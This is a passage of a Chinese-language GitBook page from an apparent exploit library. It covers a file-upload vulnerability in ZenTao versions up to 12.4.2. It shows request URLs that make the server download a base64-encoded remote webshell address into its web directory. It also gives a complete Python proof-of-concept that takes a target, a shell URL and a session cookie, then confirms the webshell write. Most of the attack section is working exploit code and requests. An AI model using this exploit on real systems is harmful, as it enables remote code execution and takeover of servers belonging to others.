+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="30206ec8-e503-4a17-8af0-e44b83228300" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p>&#x627E;&#x5230;&#x4E86;<strong>download</strong>&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x6709;&#x4E24;&#x79CD;&#x4E0B;&#x8F7D;&#x6076;&#x610F;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/www/client-download-[$version&#x53C2;&#x6570;]-[base64&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x6076;&#x610F;&#x6587;&#x4EF6;&#x5730;&#x5740;].html
+http://xxx.xxx.xxx.xxx/www/index.php?m=client&amp;f=download&amp;version=[$version&#x53C2;&#x6570;]&amp;link=[base64&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x6076;&#x610F;&#x6587;&#x4EF6;&#x5730;&#x5740;]
+</code></pre><p>&#x9996;&#x5148;&#x5148;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x6076;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;FTP&#x4E5F;&#x53EF;&#x4EE5;&#x662F;HTTP</p>
+<p>&#x4F8B;&#x5982;&#x6211;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;URL&#x4E3A;<strong><a href="http://peiqi.tech/SHELL.php" target="_blank">http://peiqi.tech/SHELL.php</a></strong></p>
+<pre><code>http://peiqi.tech/SHELL.php
+|
+base64&#x52A0;&#x5BC6;  HTTP://peiqi.tech/SHELL.php
+|
+SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw
+</code></pre><p>&#x8BF7;&#x6C42;&#x5730;&#x5740;&#x5219;&#x4E3A;</p>
+<pre><code>http://xxx.xxx.xxx.xxx/www/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw
+</code></pre><p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="ca66fb21-595e-4b7d-8870-208101c6b64e" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p>&#x4E0B;&#x8F7D;&#x7684;&#x76EE;&#x5F55;&#x5730;&#x5740;&#x4E3A;<strong>zentaopms\www\data\client\1</strong></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>&#x76EE;&#x5F55;&#x4E3A;version&#x540D;&#x79F0;</p>
+</blockquote>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="46d215c4-9439-41d2-9f3b-2471182bffa6" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<p>&#x6210;&#x529F;&#x4E0A;&#x4F20;webshell</p>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="32403e66-53c3-4291-a71e-8932c677eb54" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a></p>
+<h2 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;poc">&#x6F0F;&#x6D1E;&#x5229;&#x7528;POC</h2>
+<blockquote>
+<p>[!NOTE]</p>
+<p>POC&#x4F7F;&#x7528;&#x9700;&#x8981;&#x62E5;&#x6709;&#x540E;&#x53F0;Cookie</p>
+</blockquote>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-comment">#-*- coding:utf-8 -*-</span>
+<span class="hljs-comment"># author : PeiQi</span>
+<span class="hljs-comment"># from   : http://wiki.peiqi.tech</span>
+
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> sys
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span><span class="hljs-params">()</span>:</span>
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34m&#x516C;&#x4F17;&#x53F7; : PeiQi&#x6587;&#x5E93;                                                \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[34mVersion: zentao version &lt;= 12.4.2                                 \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36m&#x4F7F;&#x7528;&#x683C;&#x5F0F;: python3 CNVD-C-2020-121325.py                             \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mShell       &gt;&gt;&gt; http://xxx.xxx.xxx.xxx/shell.php(&#x6076;&#x610F;&#x6587;&#x4EF6;&#x5730;&#x5740;)       \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mZentaosid   &gt;&gt;&gt; xxxxxxxxxxxxxx(cookie&#x5B57;&#x6BB5;)                          \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url)</span>:</span>
+    version_url = target_url + <span class="hljs-string">&quot;/www/index.php?mode=getconfig&quot;</span>
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+    }
+    <span class="hljs-keyword">try</span>:
+        response = requests.get(url=version_url, timeout=<span class="hljs-number">20</span>, headers=headers)
+        version = json.loads(response.text)[<span class="hljs-string">&apos;version&apos;</span>]
+        print(<span class="hljs-string">&quot;\033[32m[o] &#x7985;&#x9053;&#x7248;&#x672C;&#x4E3A;:{}\033[0m&quot;</span>.format(version))
+
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x83B7;&#x53D6;&#x7248;&#x672C;&#x5931;&#x8D25; \033[0m&quot;</span>, e)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_2</span><span class="hljs-params">(target_url, shell_url, zentaosid)</span>:</span>
+    options = shell_url.split(<span class="hljs-string">&quot;://&quot;</span>)
+    <span class="hljs-keyword">if</span> options[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;http&quot;</span>:
+        shell_url = <span class="hljs-string">&quot;HTTP://&quot;</span> + options[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">elif</span> options[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;ftp&quot;</span>:
+        shell_url = <span class="hljs-string">&quot;ftp://&quot;</span> + options[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">else</span>:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x8BF7;&#x4F7F;&#x7528;&#x6B63;&#x786E;&#x7684;&#x8BF7;&#x6C42;&#x5730;&#x5740; \033[0m&quot;</span>)
+        sys.exit(<span class="hljs-number">0</span>)
+
+    headers = {
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,
+        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid={}&quot;</span>.format(zentaosid)
+    }
+
+    shell_url_base = str((base64.b64encode(shell_url.encode(<span class="hljs-string">&apos;utf-8&apos;</span>))),<span class="hljs-string">&apos;utf-8&apos;</span>)
+    vuln_url = target_url + <span class="hljs-string">&quot;/www/index.php?m=client&amp;f=download&amp;version=test&amp;link={}&quot;</span>.format(shell_url_base)
+    print(<span class="hljs-string">&quot;\033[32m[o] &#x8BF7;&#x6C42;&#x6F0F;&#x6D1E;url&#xFF1A;{}\033[0m&quot;</span>.format(vuln_url))
+
+    <span class="hljs-keyword">try</span>:
+        response = requests.get(url=vuln_url, timeout=<span class="hljs-number">20</span>, headers=headers)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x4FDD;&#x5B58;&#x6210;&#x529F;&quot;</span> <span class="hljs-keyword">in</span> response.text:
+            print(<span class="hljs-string">&quot;\033[32m[o] &#x6210;&#x529F;&#x5199;&#x5165;Webshell&#xFF0C;URL&#x5730;&#x5740;&#x4E3A;&#xFF1A;{}/www/data/client/test/Webshell_name.php\033[0m&quot;</span>.format(target_url))
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;\033[31m[x] &#x6076;&#x610F;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x5931;&#x8D25; \033[0m&quot;</span>)
+    <span class="hljs-keyword">except</span>:
+        print(<span class="hljs-string">&quot;\033[31m[x] &#x6076;&#x610F;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x5931;&#x8D25; \033[0m&quot;</span>)
+
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    title()
+    target_url = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m&quot;</span>))
+    shell_url  = str(input(<span class="hljs-string">&quot;\033[35mShell &gt;&gt;&gt; \033[0m&quot;</span>))
+    zentaosid  = str(input(<span class="hljs-string">&quot;\033[35mZentaosid &gt;&gt;&gt; \033[0m&quot;</span>))
+    POC_1(target_url)
+    POC_2(target_url, shell_url, zentaosid)
+</code></pre>
+<p><a href="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-11.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" data-lightbox="c8967954-d1c4-4f74-88be-45d1d4fd2852" data-title="" target="_blank"><img src="http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/zentao-11.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></a> </p>
+<footer class="page-footer"><span class="copyright">POChouse all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">File Modify: 
+2021-06-28 20:31:33
+</span></footer>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="禅道 11.6版本 任意文件写入漏洞.html" class="navigation navigation-prev " aria-label="Previous page: 禅道 11.6版本 任意文件写入漏洞">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../../[+] 编辑器上传漏洞/" class="navigation navigation-next " aria-label="Next page: [+] 编辑器上传漏洞">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325","level":"1.2.5.4","depth":3,"next":{"title":"[+] 编辑器上传漏洞","level":"1.3","depth":1,"path":"[+] 编辑器上传漏洞/README.md","ref":"[+] 编辑器上传漏洞/README.md","articles":[]},"previous":{"title":"禅道 11.6版本 任意文件写入漏洞","level":"1.2.5.3","depth":3,"path":"[+] 协同办公OA系统/Zentao-禅道/禅道 11.6版本 任意文件写入漏洞.md","ref":"[+] 协同办公OA系统/Zentao-禅道/禅道 11.6版本 任意文件写入漏洞.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"POChouse"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/cckuailong"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"POChouse","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"POChouse","language":"zh-hans","gitbook":"*","description":"Poc文库"},"file":{"path":"[+] 协同办公OA系统/Zentao-禅道/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.md","mtime":"2021-06-28T12:31:33.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-08-28T07:01:20.384Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-accordion/accordionSelector.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
